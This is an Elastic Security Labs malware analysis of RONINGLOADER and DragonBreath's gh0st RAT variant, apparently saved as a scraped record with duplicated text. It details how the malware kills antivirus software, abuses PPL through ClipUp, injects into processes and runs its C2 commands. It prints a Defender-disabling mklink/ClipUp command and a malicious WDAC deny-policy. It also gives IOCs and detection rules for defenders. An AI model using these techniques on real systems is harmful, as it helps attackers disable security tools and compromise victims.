ID=\"ID_ALLOW_A_019A298478CE7BF4902DE08CA2D17630\" FileName=\"*\" /> <Allow ID=\"ID_ALLOW_A_019A298478CE7AB089C369772F34B39B\" FileName=\"*\" /> <Deny ID=\"ID_DENY_A_019A298478CE7DBA9913BFC227DACD14\" FileName=\"360rp.exe\" InternalName=\"360rp.exe\" FileDescription=\"360\u6740\u6bd2 \u5b9e\u65f6\u76d1\u63a7\" ProductName=\"360\u6740\u6bd2\" /> <Deny ID=\"ID_DENY_A_019A298478CE763C85C9F42EC8669750\" FileName=\"360sd.exe\" InternalName=\"360sd.exe\" FileDescription=\"360\u6740\u6bd2 \u4e3b\u7a0b\u5e8f\" ProductName=\"360\u6740\u6bd2\" /> <FileAttrib ID=\"ID_FILEATTRIB_A_019A298478CE766B9C39FB9CE6805A11\" FileName=\"ARPProte.exe\" MinimumFileVersion=\"6.0.0.0\" /> </FileRules> <Signers> <Signer ID=\"ID_SIGNER_A_019A298478CE7608908CAE58FD9C3D8E\" Name=\"\"> <CertRoot Type=\"TBS\" Value=\"A229D2722BC6091D73B1D979B81088C977CB028A6F7CBF264BB81D5CC8F099F87D7C296E48BF09D7EBE275F5498661A4\" /> <CertPublisher Value=\"\u5317\u4eac\u706b\u7ed2\u7f51\u7edc\u79d1\u6280\u6709\u9650\u516c\u53f8\" /> <FileAttribRef RuleID=\"ID_FILEATTRIB_A_019A298478CE766B9C39FB9CE6805A11\" /> </Signer> <Signer ID=\"ID_SIGNER_A_019A298478CE77F7B523D1581F518639\" Name=\"\"> <CertRoot Type=\"TBS\" Value=\"A229D2722BC6091D73B1D979B81088C977CB028A6F7CBF264BB81D5CC8F099F87D7C296E48BF09D7EBE275F5498661A4\" /> <CertPublisher Value=\"\u5317\u4eac\u706b\u7ed2\u7f51\u7edc\u79d1\u6280\u6709\u9650\u516c\u53f8\" /> </Signer> </Signers> ...Truncated Stage 3 - goldendays.dll In the previous stage, RONINGLOADER creates a new service named MicrosoftSoftware2ShadowCop4yProvider to run the next stage of execution with the following command: regsvr32.exe /S \"C:\\ProgramData\\Roning\\goldendays.dll . The primary goal of this component is to inject the next payload into a legitimate, high-privilege system process to camouflage its activities. To achieve this, RONINGLOADER first identifies a suitable target process. It has a hardcoded list of two service names that it attempts to start sequentially: TrustedInstaller ( TrustedInstaller.exe ) MicrosoftEdgeElevationService ( elevation_service.exe ) The malware iterates through this list, attempting to start each service. Once a service is successfully started, or if one is found already running, the malware saves its Process ID (PID) for the injection phase. Next, the malware establishes persistence by creating a batch file with a random name within the C:\\Windows\\ directory (e.g., C:\\Windows\\KPeYvogsPm.bat ). The script inside this file runs a continuous loop with the following logic: It checks if the captured PID of the trusted service (e.g., PID 4016 for TrustedInstaller.exe ) is still running If the service is not running, the script restarts the previously created malicious service ( MicrosoftSoftware2ShadowCop4yProvider ) to ensure the malware's components remain active If the service process is running, the script sleeps for 10 seconds before checking again Finally, the malware reads the contents of C:\\ProgramData\\Roning\\trustinstaller.bin . Using the PID of the trusted service it acquired earlier, it injects this payload into the target process ( TrustedInstaller.exe or elevation_service.exe ). The injection method is straightforward: it performs a remote virtual allocation with VirtualAllocEx , writes to it with WriteProcessMemory , and then creates a remote thread to execute it with CreateRemoteThread . Stage 3 - trustinstaller.bin The third stage, contained within trustinstaller.bin , is responsible for injecting the final payload into a legitimate process. It starts by enumerating running processes and searching for a target by matching process names against a hardcoded list of potential processes. When found, it will inject the shellcode into C:\\ProgramData\\Roning\\Enpug.bin , which is the final payload. It will create a section with NtCreateSection , map a view of it in the remote process with NtMapViewOfSection , and write the payload to it. Then it will create a remote thread with CreateRemoteThread . Stage 4 - Final Payload The final payload has not undergone major changes since Sophos \u2019s discovery of a DragonBreath campaign in 2023 and QianXin\u2019s report in mid-2022. It is still a modified version of the open-source gh0st RAT. In the more recent campaigns, a mutex of value Global\\DHGGlobalMutex is created at the very beginning of execution. Outside the main C2 communication loop, dead code is observed creating a mutex named MyUniqueMutexName and immediately destroying it afterward. The C2 domain and port remain hardcoded but are now XOR-encrypted. The C2 channel operates over raw TCP sockets with messages encrypted in both directions. Victim Beacon Data The implant checks in with the C2 server and repeatedly beacons to the C2 at random intervals, implemented through Sleep(<random_amount> * 1000) . Below is the structure for the data that the implant returns to the C2 server during the beaconing interval: struct BeaconData { // +0x000 uint32_t message_type; // Example Beacon ID - 0xC8 (200) // +0x004 uint32_t local_ip; // inet_addr() of victim's IP // +0x008 char hostname[50]; // Computer name or registry \"Remark\" // +0x03A char windows_version[?]; // OS version info // +0x0D8 char cpu_name[64]; // Processor name // +0x118 uint32_t entry_rdx; // +0x11C char time_value[64]; // Implant installed time or registry \"Time\" value // +0x15C char victim_tag[39]; // Command 6 buffer (Custom victim tag) // +0x183 uint8_t is_wow64; // 1 if 32-bit on 64-bit Windows // +0x184 char av_processes_found[128]; // Antivirus processes found // +0x204 char uptime[12]; // System uptime char padding[52]; // +0x244 char crypto_wallet_track[64]; // \"\u72d0\u72f8\u7cfb\u5217\" (MetaMask) or registry \"ZU\" (crypto related tracking) // +0x284 uint8_t is_admin; // 1 if running with admin rights // +0x285 char data[?]; // +0x305 uint8_t telegram_installed; // 1 if Telegram installed // +0x306 uint8_t telegram_running; // 1 if Telegram.exe running // +0x307 // (padding to 0x308 bytes) }; C2 commands Request messages sent from the C2 server to the implant follow the structure: struct C2_to_implant_msg { uint32_t total_message_len; uint32_t RC4_key; char encrypted_command_id; uint8_t encrypted_command_args; }; The implant decrypts C2 messages through the following formula: RC4_decrypt(ASCII(decimal(RC4_key)), encrypted_command_id || command) Below is a list of available commands that, for the most part, remain the same as 2 years ago: Command ID Description 0 ExitWindowsEx via a supplied EXIT_WINDOWS_FLAGS 1 Terminate implant gracefully 2 Set registry key Enable to False to terminate & disable implant persistently 3 Set registry key Remark for custom victim renaming (default value: hostname) 4 Set registry key ZU for MetaMask / crypto-related tagging 5 Clear Windows Event logs (Application, Security, System) 6 Set additional custom tags when client beacons 7 Download and execute file via supplied URL 9 ShellExecute (visible window) 10 ShellExecute (hidden window) 112 Get clipboard data 113 Set clipboard data 125 ShellExecute cmd.exe with command parameters (hidden window) 126 Execute payload by dropping to disk or reflectively load and execute PluginMe export 128 First option - open a new session with a supplied C2 domain, port, and beacon interval. Second option - set registry key CopyC to update C2 domain and port permanently. Stored encrypted via Base64Encode(XOR(C2_domain_and_port, 0x5)) . 241 Check if Telegram is installed and/or running 243 Configure Clipboard Hijacker 101 , 127 , 236 , [...] Custom shellcode injection into svchost.exe using WTS session token impersonation, falling back to CREATE_SUSPENDED process injection via CreateRemoteThread Analyst note: There are multiple command IDs that point to the same command. We used an ellipsis to identify when this was observed. System Logger In addition to the C2 commands, the implant implements a keystroke, clipboard, and active-window logger. Captured data is written to %ProgramData%\\microsoft.dotnet.common.log and can be enabled or disabled via a registry key at HKEY_CURRENT_USER\\offlinekey\\open ( 1 to enable, 0 to disable). The log file implements automatic rotation, deleting itself when it exceeds 50 MB to avoid detection through excessive disk usage. The code snippet below demonstrates the initialization routine that implements log rotation and configures a DirectInput8 interface to acquire the keyboard device for event capture, followed by the keyboard event retrieval logic. The malware then enters a monitoring loop to capture three categories of information. First, it monitors the clipboard using OpenClipboard and GetClipboardData , logging any changes to text content with the prefix [\u526a\u5207\u677f:] . Second, it tracks window focus changes via GetForegroundWindow , logging the active window title and timestamp with the prefixes [\u6807\u9898:] and [\u65f6\u95f4:] , respectively, whenever the user switches applications. Third, it retrieves buffered keyboard events from the DirectInput8 device (up to 60 events per poll) and translates them into readable text through a character mapping table, prepending the results with a prefix [\u5185\u5bb9:] . Clipboard Hijacker The malware also implements a clipboard hijacker that is remotely configured through C2 command ID 243. It monitors clipboard changes and performs search-and-replace operations on captured text, substituting attacker-defined strings with replacement values. Configuration parameters are stored in the registry under HKEY_CURRENT_USER\\offlinekey with keys clipboard (enable/disable feature), charac (search string), characLen (search length), and newcharac (replacement string). It registers a window class named ClipboardListener_Class_Toggle and creates a hidden window titled ClipboardMonitor to receive clipboard change notifications. The window procedure handles WM_CLIPBOARDUPDATE ( 0x31D ) messages by verifying clipboard sequence numbers with GetClipboardSequenceNumber to detect genuine changes, then invoking the core manipulation routine, which swaps the clipboard content via EmptyClipboard and SetClipboardData . Malware and MITRE ATT&CK Elastic uses the MITRE ATT&CK framework to document common tactics, techniques, and procedures that advanced persistent threats use against enterprise networks. Tactics Tactics represent the why of a technique or sub-technique. It is the adversary\u2019s tactical goal: the reason for performing an action. Execution Persistence Privilege Escalation Defense Evasion Credential Access Discovery Collection Command and Control Techniques Techniques represent how an adversary achieves a tactical goal by performing an action. Command and Scripting Interpreter: Windows Command Shell System Services: Service Execution Create or Modify System Process: Windows Service Abuse Elevation Control Mechanism: Bypass User Account Control Access Token Manipulation Impair Defenses: Disable or Modify Tools Impair Defenses: Disable or Modify System Firewall Indicator Removal: Clear Windows Event Logs Hijack Execution Flow: DLL Side-Loading Process Injection Masquerading: Match Legitimate Name or Location Modify Registry Subvert Trust Controls: Code Signing Policy Modification Input Capture: Keylogging Clipboard Data Process Discovery System Information Discovery System Owner/User Discovery Software Discovery: Security Software Discovery Non-Application Layer Protocol Encrypted Channel: Symmetric Cryptography Mitigations Detection Potential Evasion via ClipUp Execution Suspicious Remote Memory Allocation Potential Suspended Process Code Injection Remote Memory Write to Trusted Target Process Remote Process Memory Write by Low Reputation Module Process Memory Write to a Non Child Process Unbacked Shellcode from Unsigned Module UAC Bypass Attempt via WOW64 Logger DLL Side-Loading Network Connect API from Unbacked Memory Rundll32 or Regsvr32 Loaded a DLL from Unbacked Memory Network Module Loaded from Suspicious Unbacked Memory YARA Elastic Security has created YARA rules to identify this activity. Below are YARA rules to identify RONINGLOADER and the final implant: Windows.Trojan.RoningLoader Windows.Trojan.DragonBreath Observations The following observables were discussed in this research. Observable Type Name Reference da2c58308e860e57df4c46465fd1cfc68d41e8699b4871e9a9be3c434283d50b SHA-256 klklznuah.msi Initial MSI installer 82794015e2b40cc6e02d3c1d50241465c0cf2c2e4f0a7a2a8f880edaee203724 SHA-256 Snieoatwtregoable.exe Malicious installer unpacked from initial installer c65170be2bf4f0bd71b9044592c063eaa82f3d43fcbd8a81e30a959bcaad8ae5 SHA-256 Snieoatwtregoable.dll Stage 1 - loader for stage 2 2515b546125d20013237aeadec5873e6438ada611347035358059a77a32c54f5 SHA-256 ollama.sys Stage 2 - driver for process termination 1613a913d0384cbb958e9a8d6b00fffaf77c27d348ebc7886d6c563a6f22f2b7 SHA-256 tp.png Stage 2 - encrypted core payload 395f835731d25803a791db984062dd5cfdcade6f95cc5d0f68d359af32f6258d SHA-256 1.bat Stage 2 - UAC bypass script 1c1528b546aa29be6614707cbe408cb4b46e8ed05bf3fe6b388b9f22a4ee37e2 SHA-256 fhq.bat Stage 2 - script to block networking for AV processes 4d5beb8efd4ade583c8ff730609f142550e8ed14c251bae1097c35a756ed39e6 SHA-256 1.dll Stage 2 - AV processes termination 96f401b80d3319f8285fa2bb7f0d66ca9055d349c044b78c27e339bcfb07cdf0 SHA-256 {31351756-3F24-4963-8380-4E7602335AAE}.cip Stage 2 - WDAC policy 33b494eaaa6d7ed75eec74f8c8c866b6c42f59ca72b8517b3d4752c3313e617c SHA-256 goldendays.dll Stage 3 - entry point fc63f5dfc93f2358f4cba18cbdf99578fff5dac4cdd2de193a21f6041a0e01bc SHA-256 trustinstaller.bin Stage 3 - loader for Enpug.bin fd4dd9904549c6655465331921a28330ad2b9ff1c99eb993edf2252001f1d107 SHA-256 Enpug.bin Stage 3 - loader for final payload 3dd470e85fe77cd847ca59d1d08ec8ccebe9bd73fd2cf074c29d87ca2fd24e33 SHA-256 6uf9i.exe Stage 4 - final payload qaqkongtiao[.]com domain-name Stage 4 - final payload C2 References The following were referenced throughout the above research: https://nsis.sourceforge.io/Main_Page https://learn.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service https://github.com/Jemmy1228/HookSigntool https://www.safebreach.com/blog/process-injection-using-windows-thread-pools/ https://hijacklibs.net/entries/microsoft/built-in/wow64log.html https://en.wikipedia.org/wiki/Fowler%E2%80%93Noll%E2%80%93Vo_hash_function https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html https://github.com/TwoSevenOneT/EDR-Freeze/blob/ceffd5ea7b813b356c77d469561dbb5ee45aeb24/PPLHelp.cpp#L43 https://news.sophos.com/en-us/2023/05/03/doubled-dll-sideloading-dragon-breath/ https://ti.qianxin.com/blog/articles/operation-dragon-breath-%28apt-q-27%29-dimensionality-reduction-blow-to-the-gambling-industry/ https://github.com/sin5678/gh0st Jump to section Introduction Key takeaways Discovery RONINGLOADER code analysis Stage 1 Stage 2 - tp.png AV process termination via injected remote process AV process termination Embedded archives Batch scripts to bypass UAC and AV networking Show more Elastic Security Labs Newsletter Sign Up Share this article X Facebook LinkedIn Reddit Sitemap Elastic.co @elasticseclabs \u00a9 2026 . Elasticsearch B.V. All Rights Reserved.",
    "filtered_content": "RONINGLOADER: DragonBreath\u2019s New Path to PPL Abuse \u2014 Elastic Security Labs Explore Elastic: elastic.co Search Labs Observability Labs About Research Product Updates Reports Enablement Subscribe Start free trial Contact sales Open navigation menu 15 November 2025 \u2022 Jia Yu Chan \u2022 Salim Bitam RONINGLOADER: DragonBreath\u2019s New Path to PPL Abuse Elastic Security Labs uncovers RONINGLOADER, a multi-stage loader deploying DragonBreath\u2019s updated gh0st RAT variant. The campaign weaponizes signed drivers, thread-pool injection, and PPL abuse to disable Defender and evade Chinese EDR tools. 24 min read Malware Analysis Introduction Elastic Security Labs identified a recent campaign distributing a modified variant of the gh0st RAT, attributed to the Dragon Breath APT (APT-Q-27), through trojanized NSIS installers masquerading as legitimate software such as Google Chrome and Microsoft Teams. The infection chain employs a multi-stage delivery mechanism that leverages various evasion techniques, with many redundancies aimed at neutralising endpoint security products popular in the Chinese market. These include bringing a legitimately signed driver, deploying custom WDAC policies, and tampering with the Microsoft Defender binary through PPL abuse. This campaign primarily targets Chinese-speaking users and demonstrates a clear evolution in adaptability compared to earlier DragonBreath-related campaigns documented in 2022-2023. Through this report, we hope to raise awareness of new techniques this malware is starting to implement and to shine a light on a unique loader we are naming RoningLoader. Key takeaways The malware employs an abuse of Protected Process Light (PPL) to disable Windows Defender Threat actors leverage a valid, signed kernel driver to kill processes Custom unsigned WDAC policy applied to block 360 Total Security and Huorong executables Phantom DLLs and payload injection via thread pools for further antivirus process termination Final payload has minor updates and is associated with DragonBreath Discovery In August 2025, research was published detailing a method to abuse Protected Process Light (PPL) to disable endpoint security tooling. Following this disclosure, we produced a behavioral rule, Potential Evasion via ClipUp Execution , and, after some threat hunting of telemetry data, we identified a live campaign employing the technique. RONINGLOADER code analysis The initial infection vector is a Windows Installer package (MSI). Upon execution, the MSI functions as a dropper, extracting two embedded Nullsoft Scriptable Install System (NSIS) installers. NSIS is a legitimate, open-source tool for creating Windows installers, but it is frequently abused by threat actors to package and deliver malware, as seen in GULOADER . In this campaign, we have observed the malicious installers being distributed under various themes, masquerading as legitimate software such as Google Chrome, Microsoft Teams, or other trusted applications to lure users into executing them. One of the nested NSIS installers is benign and installs the legitimate software, while the second is malicious and responsible for deploying the attack chain. The attack chain leverages a signed driver named ollama.sys for antivirus process termination. The driver has a signer name of Kunming Wuqi E-commerce Co., Ltd. , with a certificate valid from February 3, 2025, to February 3, 2026. Pivoting on VirusTotal revealed 71 additional signed binaries. Among these, we identified AgentTesla droppers masquerading as \u6155\u8baf\u516c\u76ca\u52a0\u901f\u5668 (MuXunAccelerator) , a gaming-focused VPN software popular among Chinese users, with samples dating back to April 2025. Notably, the signing techniques vary across samples. Some earlier samples, like inject.sys , contain HookSignTool artifacts including the string JemmyLoveJenny , while the October 2025 ollama.sys sample shows no such artifacts and uses standard signing procedures, yet both share the same certificate validity period. Comparing ollama.sys \u2019s PDB string artifact D:\\VS_Project\\\u52a0\u89e3\u5bc6\\MyDriver1\\x64\\Release\\MyDriver1.pdb with other samples, we discovered different artifacts from other submitted samples - D:\\cpp\\origin\\ConsoleApplication2\\x64\\Release\\ConsoleApplication2.pdb D:\\a_work\\1\\s\\artifacts\\obj\\coreclr\\windows.x86.Release\\Corehost.Static\\singlefilehost.pdb C:\\Users\\0\\Desktop\\EAMap\\x64\\Release\\ttt.pdb h:\\projects\\netfilter3\\bin\\Release\\Win32\\nfregdrv.pdb Due to the diversity of binaries and the large volume of submissions, we suspect the certificate may have been leaked, but this is speculation at this time. Stage 1 Our analysis began with the initial binary, identified by its SHA256 hash: da2c58308e860e57df4c46465fd1cfc68d41e8699b4871e9a9be3c434283d50b . Extracting it reveals two embedded executables: a benign installer, letsvpnlatest.exe , and the malicious installer Snieoatwtregoable.exe . The malicious installer, Snieoatwtregoable.exe , creates a new directory at C:\\Program Files\\Snieoatwtregoable\\ . Within this folder, it drops two files: a DLL named Snieoatwtregoable.dll and an encrypted file, tp.png . The core of the malicious activity resides within Snieoatwtregoable.dll , which exports a single function: DllRegisterServer . When invoked, this function reads the contents of the tp.png file from disk, then decrypts this data using a simple algorithm involving both a Right Rotate (ROR) and an XOR operation. The decrypted content is shellcode that reflectively loads and executes a PE file in memory. The malware first allocates a new memory region within its own process using the NtAllocateVirtualMemory API, then creates a new thread to execute the shellcode by calling NtCreateThreadEx . The malware attempts to remove any userland hooks by loading a fresh new ntdll.dll , then using GetProcAddress with the API name to resolve the addresses. The malware attempts to connect to localhost on port 5555 without serving any real purpose, as the result will not matter; speculatively, this is likely dead code or pre-production leftover code Stage 2 - tp.png RONINGLOADER first checks whether it has administrative privileges using the GetTokenInformation API. If not, it attempts to elevate its privileges by using the runas command to launch a new, elevated instance of itself before terminating the original process. Interestingly, the malware tries to communicate with a hardcoded URL http://www.baidu.com/ with the user-agent \u201cMozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko\u201d , but this appears to be dead code, likely due to either a removed feature or placeholder code for future versions. It is designed to extract and log the HTTP response header date from the URL. The malware then scans a list of running processes for specific antivirus solutions. It checks against a hardcoded list of process names and sets a corresponding boolean flag to \"True\" if any are found. The following is a table of processes and the associated security products hardcoded in the binary: Process name Security Product MsMpEng.exe Microsoft Defender Antivirus kxemain.exe Kingsoft Internet Security kxetray.exe Kingsoft Internet Security kxecenter.exe Kingsoft Internet Security QQPCTray.exe Tencent PC Manager QQPCRTP.exe Tencent PC Manager QMToolWidget.exe Tencent PC Manager HipsTray.exe Qihoo 360 Total Security HipsDaemon.exe Qihoo 360 Total Security HipsMain.exe Qihoo 360 Total Security 360tray.exe Qihoo 360 Total Security AV process termination via injected remote process Next, the malware kills those processes. Interestingly, the Qihoo 360 Total Security product takes a different approach than the others. First, it blocks all network communication by changing the firewall. It then calls a function to inject shellcode into the process ( vssvc.exe ) associated with the Volume Shadow Copy (VSS) service. It first grants itself the high integrity SeDebugPrivilege token. It then starts the VSS (Volume Shadow Copy Service) if it is not already running and fetches the PID of its associated process (vssvc.exe). Next, the malware uses NtCreateSection to create two separate memory sections. It then maps views of these sections into the memory space of the vssvc.exe process. The first section contains a full Portable Executable (PE) file, which is a driver with the device name \\\\.\\Ollama . The second section contains shellcode intended for execution. RONINGLOADER takes a different approach to this process injection compared to other injection methods used elsewhere in the malware. This technique leverages the thread pool to remotely execute code via a file write trigger in the remote process. This technique was documented by SafeBreach in 2023 with different variants. Once executed, the shellcode begins by dynamically resolving the addresses of the Windows APIs it needs to function. This is the only part of RONINGLOADER that employs any obfuscation, using the Fowler\u2013Noll\u2013Vo hash (FNV) algorithm to look up functions by hash instead of by name. It first fetches the addresses of CreateFileW , WriteFile , and CloseHandle to write the driver to disk to a hardcoded path, C:\\windows\\system32\\drivers\\1912763.temp . Then it performs the following operations: Create a service named xererre1 to load the driver dropped to disk For each of the following processes ( 360Safe.exe , 360Tray.exe , and ZhuDongFangYu.exe ), which are all associated with Qihoo 360 software, it calls 2 functions: one to find the PID of the process by name, followed by a function to kill the process by PID It then stops and deletes the service xererre1 To kill a process, the malware uses the driver. An analysis of the driver reveals that it registers only 1 functionality: it handles one IOCTL ID ( 0x222000 ) that takes a PID as a parameter and kills the process by first opening it with ZwOpenProcess , then terminating it with ZwTerminateProcess kernel APIs. AV process termination Returning to the main execution flow, the malware enters a loop to confirm the termination of 360tray.exe , as handled by the shellcode injected into the VSS service. It proceeds only after verifying that the process is no longer running. Immediately after this confirmation, the system restores its firewall settings. This action is likely a defensive measure intended to sever the software's communication channel, preventing it from uploading final activity logs or security alerts to its backend services. It then terminates the other security processes directly from its main process. Notably, it makes no attempt to hide these actions, abandoning the earlier API hashing technique and calling the necessary functions directly. RONINGLOADER follows a consistent, repeatable procedure to terminate its target processes: First, it writes the malicious driver to disk, this time to the temporary path C:\\Users\\analysis\\AppData\\Local\\Temp\\ollama.sys. A temporary service ( ollama ) is created to load ollama.sys into the kernel The malware then fetches the target process's PID by name and sends a request containing the PID to its driver to perform the termination. Immediately after the kill command is sent, the service is deleted. Regarding Microsoft Defender, the malware attempts to kill the MsMpEng.exe process using the same approach described above. We noticed a code bug from the author: for Microsoft Defender, the code does not check whether Defender is already running, but proceeds directly to searching for the MsMpEng.exe process. This means that if the process is not running, the malware will send 0 as the PID to the driver. The malware has more redundant code to kill security solution processes. It also injects another shellcode into svchost.exe, similar to what was injected into vssvc.exe , but the list of processes is different, as seen in the screenshot below. The injection technique also uses threadpools, but the injected code is triggered by an event. After the process termination, the malware creates 4 folders C:\\ProgramData\\lnk C:\\ProgramData\\<current_date> C:\\Users\\Public\\Downloads\\<current_date> C:\\ProgramData\\Roning Embedded archives The malware then writes three .txt files to C:\\Users\\Public\\Downloads\\<current_date> . Despite their extension, these are not text files but rather containers built with a specific format, likely adapted from another code base. This custom file structure is organized as follows: Magic Bytes: The file begins with the signature 4B 44 01 00 for identification. File Count: This is immediately followed by a value indicating the number of files encapsulated within the container. File Metadata: A header section then describes the information for each stored file. Compressed Data: Finally, each embedded file is stored in a ZLIB-compressed data block. Here\u2019s an example file format for the hjk.txt archive , which contains 2 files: 1.bat and fhq.bat . This archive format applies to 2 other embedded files in the current stage: agg.txt , which contains 3 files - Enpug.bin , goldendays.dll , and trustinstaller.bin kill.txt , which contains 1 file - 1.dll Batch scripts to bypass UAC and AV networking 1.bat is a simple batch script that disables User Account Control (UAC) by setting the EnableLUA registry value to 0. fhq.bat is another batch script that targets the program defined in C:\\ProgramData\\lnk\\123.txt and the Qihoo 360 security software (360Safe.exe) by creating firewall rules that block inbound and outbound connections to them. It also disables firewall notifications across all profiles. AV process termination via Phantom DLL The deployed DLL, 1.dll , is copied to C:\\Windows\\System32\\Wow64\\Wow64Log.dll to be side-loaded by any WOW64 processes, as Wow64Log.dll is a phantom DLL that is not present on Windows machines by default. Its task is redundant, essentially attempting to kill a list of processes using standard Windows APIs ( TerminateProcess ). ClipUp MS Defender killer The malware then attempts to use a PPL abuse technique documented by Zero Salarium in August 2025. The article\u2019s PoC targets Microsoft Defender only. Note that all of the system commands executed are through cmd.exe with the ShellExecuteW API It searches for Microsoft Defender's installation folder under C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\* , targeting only the directory with the most recent modification date, which indicates the currently used version Create a folder C:\\ProgramData\\roming and a directory link with mklink to point to the directory found with the following command: cmd.exe /c mklink /D \"C:\\ProgramData\\roming\" \u201cC:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.25050.5-0\u201d It then runs C:\\Windows\\System32\\ClipUp.exe with the following parameter: -ppl C:\\ProgramData\\roming\\MsMpEng.exe , which overwrites MsMpEng.exe with junk data, effectively disabling the EDR even after a restart The author appears to have copied code from EDR-Freeze to start ClipUp.exe . CiPolicies The malware directly targets Windows Defender Application Control (WDAC) by writing a policy file to the path C:\\\\Windows\\\\System32\\\\CodeIntegrity\\\\CiPolicies\\\\Active\\\\{31351756-3F24-4963-8380-4E7602335AAE}.cip . The malicious policy operates in a \u201cdeny-list\u201d mode, allowing most applications to run while explicitly blocking two popular Chinese antivirus vendors: Qihoo 360 Total Security by blocking 360rp.exe and 360sd.exe Huorong Security by blocking ARPProte.exe All executables signed by Huorong Security ( \u5317\u4eac\u706b\u7ed2\u7f51\u7edc\u79d1\u6280\u6709\u9650\u516c\u53f8 ) via certificate TBS hash A229D2722BC6091D73B1D979B81088C977CB028A6F7CBF264BB81D5CC8F099F87D7C296E48BF09D7EBE275F5498661A4 A critical component is the Enabled:Unsigned System Integrity Policy rule, which allows the policy to be loaded without a valid digital signature. Truncated... <Rule> <Option>Enabled:Inherit Default Policy</Option> </Rule> <Rule> <Option>Enabled:Unsigned System Integrity Policy</Option> </Rule> <Rule> <Option>Enabled:Advanced Boot Options Menu</Option> </Rule> <Rule> <Option>Enabled:Update Policy No Reboot</Option> </Rule> </Rules> <EKUs /> <FileRules> <Allow ID=\"ID_ALLOW_A_019A298478CE7BF4902DE08CA2D17630\" FileName=\"*\" /> <Allow ID=\"ID_ALLOW_A_019A298478CE7AB089C369772F34B39B\" FileName=\"*\" /> <Deny ID=\"ID_DENY_A_019A298478CE7DBA9913BFC227DACD14\" FileName=\"360rp.exe\" InternalName=\"360rp.exe\" FileDescription=\"360\u6740\u6bd2 \u5b9e\u65f6\u76d1\u63a7\" ProductName=\"360\u6740\u6bd2\" /> <Deny ID=\"ID_DENY_A_019A298478CE763C85C9F42EC8669750\" FileName=\"360sd.exe\" InternalName=\"360sd.exe\" FileDescription=\"360\u6740\u6bd2 \u4e3b\u7a0b\u5e8f\" ProductName=\"360\u6740\u6bd2\" /> <FileAttrib ID=\"ID_FILEATTRIB_A_019A298478CE766B9C39FB9CE6805A11\" FileName=\"ARPProte.exe\" MinimumFileVersion=\"6.0.0.0\" /> </FileRules> <Signers> <Signer ID=\"ID_SIGNER_A_019A298478CE7608908CAE58FD9C3D8E\" Name=\"\"> <CertRoot Type=\"TBS\" Value=\"A229D2722BC6091D73B1D979B81088C977CB028A6F7CBF264BB81D5CC8F099F87D7C296E48BF09D7EBE275F5498661A4\" /> <CertPublisher Value=\"\u5317\u4eac\u706b\u7ed2\u7f51\u7edc\u79d1\u6280\u6709\u9650\u516c\u53f8\" /> <FileAttribRef RuleID=\"ID_FILEATTRIB_A_019A298478CE766B9C39FB9CE6805A11\" /> </Signer> <Signer ID=\"ID_SIGNER_A_019A298478CE77F7B523D1581F518639\" Name=\"\"> <CertRoot Type=\"TBS\" Value=\"A229D2722BC6091D73B1D979B81088C977CB028A6F7CBF264BB81D5CC8F099F87D7C296E48BF09D7EBE275F5498661A4\" /> <CertPublisher Value=\"\u5317\u4eac\u706b\u7ed2\u7f51\u7edc\u79d1\u6280\u6709\u9650\u516c\u53f8\" /> </Signer> </Signers> ...Truncated Stage 3 - goldendays.dll In the previous stage, RONINGLOADER creates a new service named MicrosoftSoftware2ShadowCop4yProvider to run the next stage of execution with the following command: regsvr32.exe /S \"C:\\ProgramData\\Roning\\goldendays.dll . The primary goal of this component is to inject the next payload into a legitimate, high-privilege system process to camouflage its activities. To achieve this, RONINGLOADER first identifies a suitable target process. It has a hardcoded list of two service names that it attempts to start sequentially: TrustedInstaller ( TrustedInstaller.exe ) MicrosoftEdgeElevationService ( elevation_service.exe ) The malware iterates through this list, attempting to start each service. Once a service is successfully started, or if one is found already running, the malware saves its Process ID (PID) for the injection phase. Next, the malware establishes persistence by creating a batch file with a random name within the C:\\Windows\\ directory (e.g., C:\\Windows\\KPeYvogsPm.bat ). The script inside this file runs a continuous loop with the following logic: It checks if the captured PID of the trusted service (e.g., PID 4016 for TrustedInstaller.exe ) is still running If the service is not running, the script restarts the previously created malicious service ( MicrosoftSoftware2ShadowCop4yProvider ) to ensure the malware's components remain active If the service process is running, the script sleeps for 10 seconds before checking again Finally, the malware reads the contents of C:\\ProgramData\\Roning\\trustinstaller.bin . Using the PID of the trusted service it acquired earlier, it injects this payload into the target process ( TrustedInstaller.exe or elevation_service.exe ). The injection method is straightforward: it performs a remote virtual allocation with VirtualAllocEx , writes to it with WriteProcessMemory , and then creates a remote thread to execute it with CreateRemoteThread . Stage 3 - trustinstaller.bin The third stage, contained within trustinstaller.bin , is responsible for injecting the final payload into a legitimate process. It starts by enumerating running processes and searching for a target by matching process names against a hardcoded list of potential processes. When found, it will inject the shellcode into C:\\ProgramData\\Roning\\Enpug.bin , which is the final payload. It will create a section with NtCreateSection , map a view of it in the remote process with NtMapViewOfSection , and write the payload to it. Then it will create a remote thread with CreateRemoteThread . Stage 4 - Final Payload The final payload has not undergone major changes since Sophos \u2019s discovery of a DragonBreath campaign in 2023 and QianXin\u2019s report in mid-2022. It is still a modified version of the open-source gh0st RAT. In the more recent campaigns, a mutex of value Global\\DHGGlobalMutex is created at the very beginning of execution. Outside the main C2 communication loop, dead code is observed creating a mutex named MyUniqueMutexName and immediately destroying it afterward. The C2 domain and port remain hardcoded but are now XOR-encrypted. The C2 channel operates over raw TCP sockets with messages encrypted in both directions. Victim Beacon Data The implant checks in with the C2 server and repeatedly beacons to the C2 at random intervals, implemented through Sleep(<random_amount> * 1000) . Below is the structure for the data that the implant returns to the C2 server during the beaconing interval: struct BeaconData { // +0x000 uint32_t message_type; // Example Beacon ID - 0xC8 (200) // +0x004 uint32_t local_ip; // inet_addr() of victim's IP // +0x008 char hostname[50]; // Computer name or registry \"Remark\" // +0x03A char windows_version[?]; // OS version info // +0x0D8 char cpu_name[64]; // Processor name // +0x118 uint32_t entry_rdx; // +0x11C char time_value[64]; // Implant installed time or registry \"Time\" value // +0x15C char victim_tag[39]; // Command 6 buffer (Custom victim tag) // +0x183 uint8_t is_wow64; // 1 if 32-bit on 64-bit Windows // +0x184 char av_processes_found[128]; // Antivirus processes found // +0x204 char uptime[12]; // System uptime char padding[52]; // +0x244 char crypto_wallet_track[64]; // 